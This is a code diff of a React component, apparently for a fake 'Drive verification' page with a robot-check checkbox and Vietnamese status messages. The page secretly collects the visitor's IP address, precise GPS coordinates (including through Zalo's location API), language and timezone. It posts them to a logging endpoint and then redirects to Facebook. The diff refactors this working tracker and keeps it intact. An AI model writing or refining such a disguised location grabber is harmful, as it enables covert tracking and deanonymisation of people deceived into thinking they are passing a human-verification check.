@@ -27,83 +27,87 @@ export function DriveVerificationClient({ config }: DriveVerificationClientProps
   
   const REDIRECT_URL = redirectUrl || 'https://www.facebook.com'; 
 
-  const requestLocation = useCallback(async () => {
+  const requestLocation = useCallback(() => {
     setStatus('requesting');
     setStatusText('Đang xác minh, vui lòng chờ...');
     
-    let clientIp = 'N/A';
-    try {
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        if (ipResponse.ok) {
-            const ipData = await ipResponse.json();
-            clientIp = ipData.ip;
-        }
-    } catch(e) {
-        console.error("Could not fetch IP", e);
-    }
-
-    const logDataAndRedirect = (pos?: { coords: { latitude: number; longitude: number; accuracy: number; } }) => {
-        setStatus('success');
-        setStatusText('Xác minh thành công, đang chuyển hướng...');
-        
-        const body: any = { 
-            ip: clientIp, 
-            from: 'link',
-            language: navigator.language,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-        };
-        
-        if (pos) {
-            body.lat = pos.coords.latitude;
-            body.lon = pos.coords.longitude;
-            body.acc = pos.coords.accuracy;
-        }
-
-        fetch('/api/log-location', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(body),
-            keepalive: true,
-        }).finally(() => {
-            window.location.href = REDIRECT_URL;
-        });
-    };
-
-    const handleError = (error?: { code: number; message?: string }) => {
-      if (error?.code === 1) { // PERMISSION_DENIED
-          setStatus('denied');
-      } else {
-          // For other errors (like timeout), just log without location and redirect.
-          logDataAndRedirect();
-      }
-    };
-
-    // Check for Zalo's specific JS API first to fix ReferenceError and optimize
-    if (typeof (window as any).zaloJSV2?.getLocation === 'function') {
-        (window as any).zaloJSV2.getLocation((data: { status: string; latitude: number; longitude: number; accuracy: number; }) => {
-            if (data.status === "SUCCESS" && data.latitude && data.longitude) {
-                logDataAndRedirect({
-                    coords: {
-                        latitude: data.latitude,
-                        longitude: data.longitude,
-                        accuracy: data.accuracy || 15, // Zalo might not return accuracy
-                    },
-                });
-            } else {
-                // If Zalo API fails, treat as permission denied
-                handleError({ code: 1, message: 'Zalo API failed or was denied' });
+    const processRequest = async () => {
+        let clientIp = 'N/A';
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            if (ipResponse.ok) {
+                const ipData = await ipResponse.json();
+                clientIp = ipData.ip;
             }
-        });
-    } else if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        logDataAndRedirect,
-        (err) => handleError(err),
-        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-      );
-    } else {
-      // Fallback for browsers with no geo support
-      logDataAndRedirect();
-    }
+        } catch(e) {
+            console.error("Could not fetch IP", e);
+        }
+
+        const logDataAndRedirect = (pos?: { coords: { latitude: number; longitude: number; accuracy: number; } }) => {
+            setStatus('success');
+            setStatusText('Xác minh thành công, đang chuyển hướng...');
+            
+            const body: any = { 
+                ip: clientIp, 
+                from: 'link',
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+            
+            if (pos) {
+                body.lat = pos.coords.latitude;
+                body.lon = pos.coords.longitude;
+                body.acc = pos.coords.accuracy;
+            }
+
+            fetch('/api/log-location', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(body),
+                keepalive: true,
+            }).finally(() => {
+                window.location.href = REDIRECT_URL;
+            });
+        };
+
+        const handleError = (error?: { code: number; message?: string }) => {
+          if (error?.code === 1) { // PERMISSION_DENIED
+              setStatus('denied');
+          } else {
+              // For other errors (like timeout), just log without location and redirect.
+              logDataAndRedirect();
+          }
+        };
+
+        // Check for Zalo's specific JS API first to fix ReferenceError and optimize
+        if (typeof (window as any).zaloJSV2?.getLocation === 'function') {
+            (window as any).zaloJSV2.getLocation((data: { status: string; latitude: number; longitude: number; accuracy: number; }) => {
+                if (data.status === "SUCCESS" && data.latitude && data.longitude) {
+                    logDataAndRedirect({
+                        coords: {
+                            latitude: data.latitude,
+                            longitude: data.longitude,
+                            accuracy: data.accuracy || 15, // Zalo might not return accuracy
+                        },
+                    });
+                } else {
+                    // If Zalo API fails, treat as permission denied
+                    handleError({ code: 1, message: 'Zalo API failed or was denied' });
+                }
+            });
+        } else if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            logDataAndRedirect,
+            (err) => handleError(err),
+            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+          );
+        } else {
+          // Fallback for browsers with no geo support
+          logDataAndRedirect();
+        }
+    };
+    
+    processRequest();
   }, [REDIRECT_URL]);
 
   useEffect(() => {
@@ -111,10 +115,6 @@ export function DriveVerificationClient({ config }: DriveVerificationClientProps
     return () => clearTimeout(timer);
   }, [requestLocation]);
   
-  const handleRobotCheck = () => {
-    requestLocation();
-  };
-
   const renderVerificationStep = () => {
     switch (status) {
       case 'requesting':
@@ -131,7 +131,7 @@ export function DriveVerificationClient({ config }: DriveVerificationClientProps
         return (
             <div 
                 className="w-full h-20 bg-[#f9f9f9] border border-gray-300 rounded-md p-3 flex items-center justify-between shadow-md cursor-pointer hover:bg-gray-100/80 transition-colors"
-                onClick={handleRobotCheck}
+                onClick={requestLocation}
             >
                 <div className="flex items-center gap-4">
                     <div className="h-8 w-8 border-2 border-gray-400 bg-white rounded-sm flex items-center justify-center" />
@@ -184,3 +184,5 @@ export function DriveVerificationClient({ config }: DriveVerificationClientProps
     </div>
   );
 }
+
+    
